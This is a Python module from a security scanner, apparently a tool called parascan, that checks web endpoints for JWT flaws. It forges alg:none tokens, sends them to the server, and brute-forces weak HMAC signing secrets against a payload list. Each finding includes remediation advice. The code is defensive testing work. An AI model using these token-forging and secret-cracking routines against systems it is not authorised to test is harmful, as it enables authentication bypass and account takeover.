"""JWT attack scanner — alg:none, weak secret brute-force, key confusion."""

from __future__ import annotations

import json
import base64
import hmac
import hashlib
from typing import Any

import httpx
import yaml

from parascan.scanners.base import BaseScanner, ScanResult


REMEDIATION_ALG_NONE = (
    "Enforce a specific algorithm when verifying JWT tokens. Never trust the 'alg' "
    "header from the token itself. In your verification code, explicitly set the "
    "expected algorithm (e.g., algorithms=['HS256'] in PyJWT, or algorithm: 'HS256' "
    "in jsonwebtoken). Reject tokens with 'none' algorithm."
)

REMEDIATION_WEAK_SECRET = (
    "Use a cryptographically strong random secret for signing JWTs (at least 256 bits). "
    "Generate it with a CSPRNG (e.g., openssl rand -base64 32). Consider switching to "
    "asymmetric algorithms (RS256/ES256) where only the server holds the private key. "
    "Rotate secrets periodically."
)

SOC2 = "CC6.1"


class JWTScanner(BaseScanner):
    module_name = "jwt"
    description = "JWT vulnerability detection (alg:none, weak secrets, key confusion)"

    def __init__(self) -> None:
        super().__init__()
        self._payloads_data = self._load_payloads()

    def _load_payloads(self) -> dict:
        import pathlib

        path = pathlib.Path(__file__).parent.parent / "payloads" / "jwt.yaml"
        if not path.exists():
            return {}
        with open(path) as f:
            return yaml.safe_load(f) or {}

    async def scan(
        self, client: httpx.AsyncClient, endpoint: dict[str, Any]
    ) -> list[ScanResult]:
        results: list[ScanResult] = []
        url = endpoint["url"]

        # look for JWT tokens in the authorization header
        auth_header = client.headers.get("Authorization", "")
        token = None

        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
        elif auth_header.startswith("bearer "):
            token = auth_header[7:]

        if not token or not _is_jwt(token):
            return results

        # test alg:none attack
        none_result = await self._test_alg_none(client, url, token)
        if none_result:
            results.append(none_result)

        # test weak secrets
        weak_result = await self._test_weak_secrets(client, url, token)
        if weak_result:
            results.append(weak_result)

        return results

    async def _test_alg_none(
        self, client: httpx.AsyncClient, url: str, token: str
    ) -> ScanResult | None:
        """test if the server accepts JWTs with alg:none."""
        try:
            header_b64, payload_b64, _ = token.split(".")
            payload_json = _b64url_decode(payload_b64)
            payload = json.loads(payload_json)
        except Exception:
            return None

        alg_attacks = self._payloads_data.get("algorithm_attacks", ["none", "None", "NONE"])

        for alg in alg_attacks:
            # craft a token with alg:none
            fake_header = _b64url_encode(json.dumps({"alg": alg, "typ": "JWT"}).encode())
            fake_payload = _b64url_encode(json.dumps(payload).encode())
            fake_token = f"{fake_header}.{fake_payload}."

            # send request with the forged token
            resp = await self._request(
                client, "GET", url,
                headers={"Authorization": f"Bearer {fake_token}"},
            )

            if resp is None:
                continue

            # if we get a successful response, alg:none is accepted
            if resp.status_code in (200, 201, 202):
                return ScanResult(
                    module=self.module_name,
                    severity="critical",
                    title="JWT alg:none bypass accepted",
                    description=(
                        f"The server accepts JWT tokens with algorithm '{alg}'. "
                        f"An attacker can forge arbitrary tokens without knowing the secret."
                    ),
                    evidence=f"Forged token accepted: alg={alg}, status={resp.status_code}",
                    request_data=f"Authorization: Bearer {fake_token[:50]}...",
                    response_data=self._format_response(resp),
                    remediation=REMEDIATION_ALG_NONE,
                    soc2_criteria=SOC2,
                )

        return None

    async def _test_weak_secrets(
        self, client: httpx.AsyncClient, url: str, token: str
    ) -> ScanResult | None:
        """brute-force the JWT secret with common weak passwords."""
        try:
            header_b64, payload_b64, signature = token.split(".")
            header_json = _b64url_decode(header_b64)
            header = json.loads(header_json)
        except Exception:
            return None

        alg = header.get("alg", "")
        if alg not in ("HS256", "HS384", "HS512"):
            return None

        signing_input = f"{header_b64}.{payload_b64}".encode()
        weak_secrets = self._payloads_data.get("weak_secrets", [])

        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)

        for secret in weak_secrets:
            expected_sig = _b64url_encode(
                hmac.new(secret.encode(), signing_input, hash_func).digest()
            )
            if expected_sig == signature:
                return ScanResult(
                    module=self.module_name,
                    severity="critical",
                    title="JWT signed with weak secret",
                    description=(
                        f"The JWT token is signed with the weak secret '{secret}'. "
                        f"An attacker can forge tokens with arbitrary claims."
                    ),
                    evidence=f"Secret found: '{secret}' (algorithm: {alg})",
                    remediation=REMEDIATION_WEAK_SECRET,
                    soc2_criteria=SOC2,
                )

        return None


def _is_jwt(token: str) -> bool:
    """check if a string looks like a JWT."""
    parts = token.split(".")
    if len(parts) != 3:
        return False
    try:
        header = json.loads(_b64url_decode(parts[0]))
        return "alg" in header
    except Exception:
        return False


def _b64url_encode(data: bytes) -> str:
    """base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    """base64url decode with padding restoration."""
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)
